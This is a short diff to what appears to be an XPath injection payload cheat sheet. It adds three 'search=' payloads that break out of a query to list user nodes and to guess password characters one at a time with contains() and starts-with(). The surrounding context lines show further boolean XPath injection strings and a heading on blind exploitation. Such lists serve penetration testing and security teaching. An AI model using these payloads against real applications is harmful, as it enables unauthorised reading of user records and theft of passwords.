@@ -28,6 +28,9 @@ x' or name()='username' or 'x'='y
 ' and count(/*)=1 and '1'='1
 ' and count(/@*)=1 and '1'='1
 ' and count(/comment())=1 and '1'='1
+search=')] | //user/*[contains(*,'
+search=Har') and contains(../password,'c
+search=Har') and starts-with(../password,'c
 ```
 
 ## Blind Exploitation
